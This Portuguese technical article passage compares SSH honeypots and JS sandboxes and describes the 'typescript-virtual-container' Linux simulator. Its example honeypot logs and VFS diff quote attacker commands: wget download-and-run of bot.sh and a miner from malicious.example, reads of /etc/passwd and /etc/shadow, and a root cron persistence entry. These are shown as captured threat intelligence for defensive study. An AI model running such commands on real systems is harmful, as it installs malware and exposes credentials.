**GitHub**: [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty` -- criação de PTY

`node-pty` cria um pseudoterminal (PTY) no Node.js e te dá um handle de leitura/escrita nele. Usado com xterm.js, permite construir um terminal de navegador que fala com um shell real (bash, zsh, fish) rodando no servidor.

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // Enviar para o navegador xterm.js via WebSocket
  ws.send(data);
});

ws.on("message", data => {
  // Transmitir as teclas do navegador para o shell
  shell.write(data);
});
```

Este é o esquema padrão para IDEs cloud e terminais web: xterm.js (navegador) ↔ WebSocket ↔ node-pty ↔ bash real. Sem isolamento. O shell executa com todas as permissões do processo Node.js (ou do usuário que o executa).

**Mantido por**: Microsoft.  
**npm**: [node-pty](https://www.npmjs.com/package/node-pty)  
**GitHub**: [microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## Parte 4 -- Os honeypots SSH

Os honeypots são projetados para serem atacados. O objetivo é parecer real o suficiente para que atacantes interajam com eles, enquanto registram tudo o que fazem para inteligência de ameaças. SSH é o alvo principal porque é o serviço mais atacado na internet -- se você expor a porta 22 em um IP público, verá tentativas de varredura automatizadas em literalmente minutos. Experimente um dia, é bem horrível o quão rápido acontece.

A qualidade de um honeypot é medida por duas coisas: **fidelidade** (o quão convincentemente imita um sistema real) e **telemetria** (quanta informação útil ele captura). Essas duas coisas estão em tensão. Um honeypot de alta fidelidade é mais difícil de construir e mais arriscado de operar.

Esta seção é o que finalmente me levou a construir o módulo `HoneyPot` no `typescript-virtual-container`, então tenho algumas opiniões aqui.

### 4.1 Cowrie -- o padrão-ouro

Cowrie é um honeypot SSH e Telnet de interação média-a-alta baseado em Python. É o honeypot SSH mais implantado na comunidade de pesquisa e segurança.

Arquitetura:
- **Camada de protocolo**: implementação real do protocolo SSH (Twisted Conch), então atacantes têm handshakes reais, troca de chaves real, autenticação real
- **Camada de shell**: um sistema de arquivos falso (semelhante ao Debian 5.0) e um interpretador de shell parcial que responde a comandos comuns
- **Modo proxy**: pode redirecionar para um sistema real por trás (modo alta interação), registrando tudo que passa
- **Modo LLM** (adição recente): usa um modelo de linguagem para gerar respostas dinâmicas a comandos que não sabe tratar -- sim, Cowrie agora tem um modo IA. Vivemos uma época louca.

```python
# O que Cowrie captura
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrie salva os arquivos baixados (via wget/curl/SFTP/SCP) para análise de malware. Integra-se com Splunk, Elasticsearch e outras plataformas SIEM.

**Fidelidade**: média-alta. Convincente o bastante para enganar bots automatizados (que representam 99% dos atacantes SSH -- a maioria são apenas scripts estúpidos que tentam `root`/`password`). Humanos sofisticados podem identificá-lo por impressão digital no entanto, geralmente bem rápido.

**Linguagem**: Python (Twisted)  
**GitHub**: [cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo -- o predecessor do Cowrie

Kippo é o honeypot SSH de interação média original no qual Cowrie foi baseado. Mesma ideia básica: protocolo SSH real, sistema de arquivos falso, shell parcial. Cowrie o suplantou completamente neste ponto -- Kippo está arquivado e ninguém deveria usá-lo em 2026. Mencionado aqui puramente para completude histórica, já que você pode vê-lo referenciado em posts de blog antigos e artigos de segurança.

**GitHub**: [desaster/kippo](https://github.com/desaster/kippo) -- arquivado

---

### 4.3 endlessh -- o tarpit SSH

endlessh é um honeypot degenerado: ele mantém conexões SSH abertas transmitindo lentamente os dados de banner a 1 byte por segundo (ou menos). Um cliente SSH que se conecta a ele vai ficar preso indefinidamente -- nunca chegará à autenticação porque o servidor nunca termina de enviar o banner.

O objetivo não é inteligência de ameaças mas pura negação de recurso: ocupar os threads de varredura dos atacantes para que não possam alcançar alvos reais tão rápido. É honestamente um pouco diabólico no bom sentido. Você não aprende nada sobre o atacante -- você só faz ele perder tempo. Há algo profundamente satisfatório nisso.

```c
// Todo o comportamento protocolar do endlessh:
// Enviar: "SSH-2.0-OpenSSH_" e então adicionar lentamente caracteres aleatórios
// Nunca fechar a conexão
// O scanner do atacante expira após N segundos
```

Nenhum comando é capturado. Nenhuma autenticação é testada. Apenas tempo de conexão.

**Escrito em**: C  
**GitHub**: [skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame -- o honeypot "deixa todo mundo entrar"

sshesame aceita todas as conexões SSH (qualquer usuário, qualquer senha, qualquer chave) e registra tudo. É um honeypot de interação zero: não responde a comandos, só deixa atacantes "entrarem" e registra cada tecla que eles digitam.

```
2024-01-15 03:22:11 Conexão de 45.33.32.156
  Usuário: root, Senha: password123 -- aceito
  Comandos digitados:
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  Desconectado após 47s
```

Útil para coleta de credenciais: você acumula rapidamente os nomes de usuário e senhas que os bots tentam, o que te diz quais credenciais padrão estão sendo bruteforcidas ativamente. Spoiler: é sempre `root`/`password`, `admin`/`admin` e `root`/`123456`. Sempre.

**GitHub**: [jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird -- framework de honeypot baseado em Docker

`lyrebird/honeypot-base` é uma imagem base Docker para construir honeypots de serviços de rede. Não é especificamente um honeypot SSH -- é um framework para construir honeypots para qualquer protocolo.

A imagem base fornece um framework de registro, um sistema de plugins para protocolos e configurações Docker Compose para honeypots multi-serviço. Você a estende para simular serviços específicos.

**Docker Hub**: [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Construir um honeypot SSH em Node.js -- o método ingênuo, e por que falha

Antes do `typescript-virtual-container`, construir um honeypot SSH em Node.js significava combinar a biblioteca real `ssh2` com uma simulação manual de comandos. Muito tedioso, muito incompleto, mas... é um rito de passagem neste ponto:

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // Registrar a tentativa
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // Deixar todo mundo entrar
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // Resposta simulada
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

Isso "funciona" no sentido de que captura credenciais e comandos. Mas é obviamente falso assim que um atacante sofisticado investiga um pouco. `uname -a` retorna a string correta mas `ls /etc` retorna "command not found" -- cheira a armadilha. O sistema de arquivos não existe. Comandos não encadeiam. Pipes não funcionam. Variáveis não se expandem.

Um atacante competente identificará seu honeypot nos primeiros cinco comandos. Scripts automatizados que procuram comportamento do tipo Cowrie também o detectarão imediatamente. Foi aparentemente isso que levou a autora do `typescript-virtual-container` a construir algo que realmente interpreta comandos de verdade -- mais sobre isso na Parte 5.

---

### Resumo da família dos honeypots

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | Ingênuo ssh2 |
|---|---|---|---|---|---|---|
| **Nível de interação** | médio-alto | médio | zero | zero | variável | baixo |
| **Protocolo SSH real** | ✅ | ✅ | ❌ (tarpit) | ✅ | variável | ✅ |
| **Fidelidade do shell** | média | média | n/a | nenhuma | variável | mínima |
| **Captura credenciais** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **Captura comandos** | ✅ | ✅ | ❌ | ✅ | variável | ✅ |
| **Captura malware** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **Integração SIEM** | ✅ nativa | ❌ | ❌ | ❌ | ❌ | manual |
| **Respostas LLM** | ✅ (novo) | ❌ | ❌ | ❌ | ❌ | ❌ |
| **Linguagem** | Python | Python | C | Go | Docker | Node.js |
| **Node.js nativo** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Status** | ✅ muito ativo | ⚠️ arquivado | ✅ ativo | ✅ ativo | ✅ ativo | DIY |

O padrão aqui é bem claro: quanto mais fidelidade você quer, mais Python você precisa escrever. Cowrie é o vencedor incontestável se você está fazendo isso a sério -- foi testado em campo por anos e captura muito mais que simples credenciais. endlessh e sshesame são projetos legais mais do que ferramentas sérias de inteligência de ameaças. E a abordagem ingênua em Node.js te leva talvez a 20% do caminho antes de você bater num muro.

---

## Parte 5 -- `typescript-virtual-container`: o que preenche a lacuna

OK então agora as coisas ficam interessantes. Depois de catalogar todas as famílias acima, o quadrante faltante fica bastante evidente:

- Os sandboxes JS: isolam código, sem shell, sem sistema de arquivos, sem SSH
- Os emuladores Linux: SO real, shell real, SSH real... mas 150+ MB de RAM, 30 segundos de inicialização, e você precisa construir sua própria API por cima das E/S seriais
- Os honeypots: shell falso, sem API programável, Python/Go/C, não nativo Node

Ninguém tinha construído um ambiente Linux completo, programável, nativo Node, com SSH real, permissões reais, rede virtual real e uma API TypeScript tipada. Então ela o construiu.

Pequena introdução já que é a primeira vez que a menciono devidamente: `typescript-virtual-container` foi construído por [Chloé Rolzhausen](https://itsrealfortune.fr), uma desenvolvedora francesa que se chama **Fortune** (ou ItsRealFortune) online. Você pode encontrá-la no seu [site](https://itsrealfortune.fr) e no [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316/). Todo o projeto -- 56 000 linhas de TypeScript, 247 arquivos, 170 comandos -- foi um esforço solo de uma única pessoa. Vou chamá-la de Fortune pelo resto do artigo. E sim, é bem louco. Dá uma olhada no trabalho dela!

### O que é realmente

`typescript-virtual-container` é um **simulador de ambiente Linux** escrito em TypeScript puro. Sem Wasm. Sem extensões nativas. Sem kernel. ~56 000 linhas de fonte distribuídas em 247 arquivos TypeScript.

A percepção chave: você não precisa de um emulador de CPU para fazer funcionar `ls /etc | grep passwd`. Você precisa de:
1. Uma árvore de nós em memória que respondem a operações de caminho
2. Um modelo de permissões POSIX aplicado a cada acesso
3. Um parser de shell que entende pipelines, redirecionamentos, subshells e expansão de variáveis
4. ~170 implementações de comandos (funções, não binários)
5. Um sistema de gerenciamento de usuários e grupos
6. Algo para expor tudo isso via SSH

Tudo isso é realizável em TypeScript puro sem qualquer envolvimento do kernel.

### O VirtualFileSystem

O VFS é uma árvore em memória de nós tipados -- sem E/S de disco a menos que você ative explicitamente o modo de persistência `"fs"`:

```ts
// Representação interna simplificada
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // placeholder carregado preguiçosamente
```

Cada operação de caminho passa por `normalizePath` (resolve `.`, `..`, links simbólicos) e `enforceAccess` (verifica permissões de leitura/escrita/execução em relação ao uid/gid solicitante). `chmod`, `chown`, sticky bits e setuid são todos implementados e realmente aplicados. Se um processo rodando como uid 1000 tenta ler um arquivo pertencente a root com modo 0600, ele obtém EACCES -- não um falso EACCES, um `Error` JavaScript real lançado a partir da verificação de permissão. Essa parte é bastante elegante honestamente.

O VFS se serializa em:
- `.vfsb` -- um formato binário compacto (personalizado, com compressão fflate) -- é o formato padrão
- Instantâneo JSON -- legível por humanos, bom para depuração
- Arquivo TAR -- import/export com o formato tar real, então você pode `tar -xf` algo e o VFS simplesmente... tem esses arquivos
- Imagem SquashFS -- import somente leitura

No modo de persistência `"fs"`, ele mantém um log de escrita antecipada (WAL) para recuperação após queda -- as escritas vão primeiro para o log, depois para o instantâneo no flush. Se o Node cair no meio de uma operação, o log te permite reconstruir o último estado completo.

Há também uma camada `FileCache` que simula a latência de E/S de disco. Você configura perfis como `NVME_DISK_IO` ou `HDD_DISK_IO` e o VFS atrasa artificialmente as operações em arquivos para corresponder a temporizações realistas. O que é bastante engraçado -- um software que se desacelera intencionalmente para simular hardware -- mas na verdade muito útil para benchmarking.

### O interpretador de shell

O parser do shell produz um AST tipado:

```ts
// "ls /etc | grep root && echo done" se analisa em:
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

O executor percorre este AST:
- Para um pipeline, ele cria uma cadeia de fluxos `{ stdin, stdout, stderr }` e executa cada comando com E/S em pipeline
- Para operadores lógicos (`&&`, `||`), ele verifica `$?` após o lado esquerdo antes de executar o direito
- Para subshells (`$(...)`, `` ` ` ``), ele bifurca o contexto de execução
- Para redirecionamentos (`>arquivo`, `>>arquivo`, `2>&1`, `<arquivo`), ele configura a ligação dos fluxos antes da execução
- Para tarefas em background (`cmd &`), ele executa sem esperar o término
- Para variáveis, ele expande `$VAR`, `${VAR:-default}`, `${#VAR}` e aritmética `$((expr))`
- Para expansão de chaves (`{a,b,c}`, `{1..5}`), ele gera a lista de expansão completa antes de executar

Tudo isso é comportamento POSIX shell real. O parser gerencia heredocs, substituição de processo, globbing (`*`, `?`, `[abc]`) e gerenciamento de aspas (aspas simples, aspas duplas com interpolação, escape por barra invertida). Não é perfeito -- casos limite existem -- mas está muito além do que você esperaria de um projeto TypeScript.

### ~170 comandos integrados

Os comandos são funções TypeScript registradas em um registro de comandos. Elas recebem um `CommandContext` com os fluxos stdin/stdout/stderr, o VFS, a sessão de usuário, o ambiente do shell e acesso a submódulos.

Escrever 170 implementações de comandos Unix é... muito. Algumas são triviais (`echo`, `true`, `false`), algumas são surpreendentemente complexas (`awk`, `find`, `tar`). Tipo, um `awk` POSIX completo? Em TypeScript? É louco honestamente. Aqui está uma amostra do que tem dentro:

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp (lado cliente, conexão de saída),
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git (stub), python3 (stub), node (stub),
nano (editor interativo completo), vim (básico), vi (básico),
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron (simulado), systemctl (stub), journalctl (stub),
...e cerca de 130 outros
```

Os "stubs" (git, python3, node) respondem de maneira realista a invocações comuns -- `python3 --version` retorna uma string de versão crível, `git status` mostra um estado de repositório fictício -- sem fazer trabalho real. Para um honeypot, são na verdade mais úteis que os comandos reais, porque permitem observar o que os atacantes tentam executar sem executar nada perigoso.

### O servidor SSH

A camada SSH usa o pacote npm real `ssh2` -- protocolo SSH real, troca de chaves real, criptografia real. `SSHMimic` o envolve:

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// SSH real: ssh -p 2222 root@localhost
// SFTP real: sftp -P 2222 root@localhost
// SCP real: scp -P 2222 file root@localhost:/tmp/
```

As `shellProperties` determinam o que `uname -a`, `lsb_release -a`, `neofetch`, `/proc/version` e `/etc/os-release` reportam. Você pode imitar qualquer distribuição Linux e versão de kernel de maneira convincente -- para um cliente SSH real, não há literalmente nenhuma maneira de diferenciar.

### O módulo HoneyPot

Porque o interpretador de shell é real e o servidor SSH é real, os comandos dos atacantes realmente executam no ambiente virtual. Requisições `wget` disparadas pelo atacante são registradas com as URLs de destino. Arquivos criados pelo atacante são salvos no VFS. Tentativas de escalonamento de privilégio do atacante produzem erros realistas.

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// Após uma sessão, diferenciar o sistema de arquivos
const before = shell.vfs.toSnapshot();
// ... sessão do atacante ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

Isso é qualitativamente diferente do Cowrie. O sistema de arquivos falso do Cowrie pode responder a `ls` mas não pode realmente rastrear os arquivos que um atacante criou e as modificações que ele fez como um diff estruturado. `typescript-virtual-container` pode, porque o VFS é uma estrutura de dados viva -- cada escrita é rastreada. Aquela entrada cron que o atacante acabou de adicionar? Está no diff. Aquela pasta `.hidden`? No diff. Bastante útil para análise de malware.

### A pilha de rede virtual

Esta é provavelmente a parte mais impressionante de todo o projeto, e não tem equivalente em nenhum outro projeto neste espaço. Tipo, uma pilha de rede virtual L2/L3 completa com suporte a VPN, escrita em TypeScript puro, sem nenhuma placa de rede real envolvida. É realmente louco.

`VirtualNetworkManager` dá a cada instância `VirtualShell` interfaces de rede virtual com endereços IP configuráveis, tabelas de roteamento e um firewall de software (regras estilo iptables com conntrack e NAT). `ip addr`, `ip route`, `iptables -L`, `netstat -rn` mostram todos o estado da rede virtual.

`VirtualSwitch` (nomeado Baie -- da palavra francesa para rack de servidores, "baie informatique") conecta múltiplos shells em uma sub-rede compartilhada. Ele implementa:
- Aprendizado MAC e ARP
- Roteamento IP entre sub-redes
- NAT (masquerade de saída)
- DNS (registros configuráveis por sub-rede)
- Balanceamento de carga (round-robin, menor número de conexões)
- Modelagem de tráfego: latência, jitter (distribuição gaussiana), perda de pacotes, perda por rajadas, reordenação, duplicação
- Limitação de banda (balde de fichas)
- Aplicação MTU
- Rastreamento de conexão (com estado, estados NEW/ESTABLISHED/TIME_WAIT)

```ts
const baie = new Baie("192.168.0.0/24");

// Três máquinas virtuais no mesmo switch
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// Firewall: web pode alcançar api, api pode alcançar db, web não pode alcançar db diretamente
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// Modelagem de tráfego: simular um link WAN instável para fora
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn` cria túneis criptografados entre instâncias de Baie -- você pode simular uma rede multi-site com interconexões VPN entre sites.

`VirtualProxy` implementa forwarding de portas e um proxy SOCKS5.

Nada disso toca uma placa de rede real. É tudo roteamento de objetos TypeScript. O comando `ping` "funciona" roteando via o switch virtual e retornando respostas ICMP simuladas. `curl http://192.168.0.3/api` roteia via a rede virtual, alcança a resposta HTTP simulada do shell api e retorna o conteúdo. São tartarugas até o fundo, no melhor sentido possível.

### O `SandboxedShell`

Para uso programático onde você precisa de um isolamento mais forte, `SandboxedShell` executa uma sessão shell em uma thread Worker Node.js:

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 25% de um núcleo
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

O isolamento aqui é garantido pela camada VFS (o shell da thread worker só pode ver o sistema de arquivos virtual, nunca o sistema de arquivos hospedeiro) mais o isolamento de memória da thread Worker Node.js. É mais leve que `isolated-vm` mas mais apropriado para isolamento no nível shell em vez de nível JS.

### Limitação de recursos

Você pode configurar limites de recursos por shell que afetam o que os comandos de monitoramento do sistema reportam:

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

Dentro deste shell, `free -m` mostra 512 MB de RAM total. `nproc` retorna 2. `/proc/meminfo` mostra os valores limitados. `htop` e `top` mostram o número de CPUs limitado. Isso te permite definir precisamente a pegada de hardware da máquina simulada.

### Três modos de implantação

```
Modo 1 : Servidor SSH/SFTP
  VirtualSshServer / VirtualSftpServer
  → Protocolo SSH real, SFTP real, SCP real
  → Caso de uso: honeypots, ambientes de teste remotos, laboratórios de treinamento

Modo 2 : Shell web (navegador)
  builds/fortune-nyx-v1.7.6-web.min.js (bundle ESM)
  → Roda no navegador, VFS persistido em IndexedDB
  → Caso de uso: tutoriais interativos, terminais embarcados, demos
  → Bônus: executa startxfce4 para um desktop XFCE completo simulado

Modo 3 : CLI autônomo
  builds/fortune-nyx-v1.7.6-directbash-k6.1.0.mjs (arquivo único, sem instalação)
  → curl e executa, VFS persistido no diretório .vfs/
  → Caso de uso: demos rápidas, experimentação local
```

### Os polyfills -- como o build de navegador funciona sem Wasm

OK esta é a parte que acho realmente inteligente e que queria destacar especialmente.

Fazer uma biblioteca Node.js funcionar no navegador é geralmente um pesadelo. Ou você usa um runtime Wasm (pesado, lento para carregar) ou passa semanas substituindo manualmente cada import `node:*` por uma alternativa compatível com navegador. Fortune fez a segunda coisa -- mas muito limpa, escrevendo um conjunto de polyfills personalizados que vivem no diretório `polyfills/` do repositório.

A pipeline de build é apenas esbuild com um monte de entradas `alias`:

```js
// demo/build.js -- toda a configuração do build de navegador
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

Sem Wasm. Sem biblioteca de polyfills externa. Sem truques de `webpack-node-externals`. Apenas módulos aliasados e algumas globais injetadas. Deixa eu detalhar cada um porque alguns são realmente impressionantes.

**`node:fs` -- IndexedDB como sistema de arquivos falso**

Este é meu favorito. O polyfill `node:fs` implementa a API síncrona Node.js fs (`readFileSync`, `writeFileSync`, `existsSync`, `readdirSync`, `mkdirSync`, `unlinkSync`, `statSync`...) sustentada por duas camadas: um `Map` em memória para leituras síncronas, e IndexedDB para persistência entre recarregamentos de página. As escritas vão para o Map imediatamente (então `readFileSync` logo após `writeFileSync` sempre funciona), depois são descarregadas para IndexedDB de forma assíncrona em segundo plano.

```js
// Cache síncrono (caminho → Uint8Array | null) -- leituras instantâneas
const memCache = new Map();

// Pré-carregar tudo do IndexedDB para memCache na inicialização
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

Esta é a razão pela qual o instantâneo VFS sobrevive a recarregamentos de página no navegador -- o binário `.vfsb` inteiro é escrito no IndexedDB através deste polyfill, e relido no próximo carregamento. Sem Wasm. Sem servidor. Apenas IndexedDB, que está em todos os navegadores desde tipo 2011.

**`node:crypto` -- SHA-256 em JS puro**

Em vez de importar uma biblioteca crypto Wasm, o polyfill crypto implementa SHA-256 do zero usando as constantes de rodada FIPS 180-4. 166 linhas de JS puro com suporte completo a saídas hex/base64/Uint8Array. Toda a hash na biblioteca passa por aqui -- a impressão digital das chaves de hospedeiro SSH, somas de verificação internas, tudo. Compacto, zero dependência, funciona.

**`node:os` -- lê o hardware real do navegador**

Esta é um belo toque. Em vez de retornar valores fictícios codificados, `node:os` lê `navigator.deviceMemory` para RAM total e `navigator.hardwareConcurrency` para número de CPUs. Então `neofetch` no build de navegador na verdade reporta algo que corresponde à sua máquina real -- não um stub falso `2 núcleos, 2 GB de RAM`.

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // 2 GB padrão
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // também analisa navigator.userAgent para adivinhar a string do modelo CPU
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`, `ssh2`, `roxify` -- stubs honestos**

O navegador não pode abrir sockets TCP ou executar SSH real, então estes são stubs que lançam um erro `NotImplemented` com uma mensagem clara se algo tentar usá-los. Sem falha silenciosa, sem `undefined` retornado onde um objeto é esperado. Apenas uma mensagem forte e clara "isso não funciona no navegador" -- que é exatamente o que você quer.

**`process.js` e `buffer.js` -- globais injetadas**

Estes dois são injetados no topo de cada arquivo do bundle via a opção `inject` do esbuild, então `process` e `Buffer` estão disponíveis globalmente sem nenhum import explícito. `process.js` é minúsculo: `env`, `version`, `platform: 'browser'`, `nextTick` via `queueMicrotask`, `uptime` via `performance.now()`. `buffer.js` é uma reimplementação completa de `Buffer` sobre `Uint8Array` -- todos os métodos `readUInt32BE`, `writeInt16LE`, as codificações hex/base64 das quais a implementação SSH e o VFS dependem.

---

O conjunto de polyfills tem cerca de 640 linhas de JS escrito à mão no total. Sem pacotes npm. Sem Wasm. E o resultado é um bundle de navegador que é apenas a biblioteca, rodando nativamente, sem nenhuma da ansiedade habitual do "mas será que realmente funciona no navegador?" que você tem com bibliotecas projetadas para Node primeiro. Vale a pena dar uma olhada na pasta `polyfills/` no repositório se você estiver curioso -- cada arquivo é bem contido e legível por si só, o que é uma escolha de estilo que aprecio muito.

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **Categoria** | Sandbox JS | Sandbox JS | Sandbox JS | Emulador | Emulador | Node.js/Wasm | Honeypot | Simulador |
| **Isola JS** | ⚠️ escopo | ✅ V8 Isolate | ✅ Wasm | n/a | n/a | parcial | n/a | ✅ Worker |
| **Kernel Linux real** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **Interpretador shell** | ❌ | ❌ | ❌ | ✅ (real) | ✅ (real) | ✅ (real) | parcial | ✅ (personalizado) |
| **~170 comandos Unix** | ❌ | ❌ | ❌ | ✅ | ✅ | parcial | ~20 | ✅ |
| **Permissões POSIX** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | parcial | ✅ aplicadas |
| **Gerenciamento usuários** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | mínimo | ✅ completo |
| **Servidor SSH real** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Honeypot/auditoria** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **Diff/instantâneo VFS** | ❌ | ❌ | ❌ | limitado | ❌ | ❌ | ❌ | ✅ |
| **Rede virtual L2/L3** | ❌ | ❌ | ❌ | básico | ❌ | ❌ | ❌ | ✅ completo |
| **VPN virtual** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Suporte navegador** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Node.js nativo** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **API tipada** | básica | ✅ | ✅ | mínima | ❌ | ✅ | ❌ | ✅ completa |
| **Compatibilidade binária** | n/a | n/a | n/a | ✅ | ✅ | parcial | n/a | ❌ |
| **Tempo inicialização** | instantâneo | instantâneo | instantâneo | 15-40s | 15-40s | 2-5s | instantâneo | <1s |
| **RAM/instância** | ~1 MB | ~3-10 MB | ~5-15 MB | 150-256 MB | 200+ MB | ~100 MB | ~50 MB | ~5-20 MB |
| **Dependências runtime** | 0 | 1 (nativa) | 1 (Wasm) | 0 | proprietário | 1 | dependências Python | 3 (ssh2, ws, fflate) |
| **Status** | estável | ✅ ativo | ✅ ativo | ✅ muito ativo | comercial | ✅ ativo | ✅ ativo | ✅ ativo |

---

## Quando usar o quê

**Você precisa executar JavaScript não confiável -- uma fórmula submetida por usuário, um plugin, um hook de script.**  
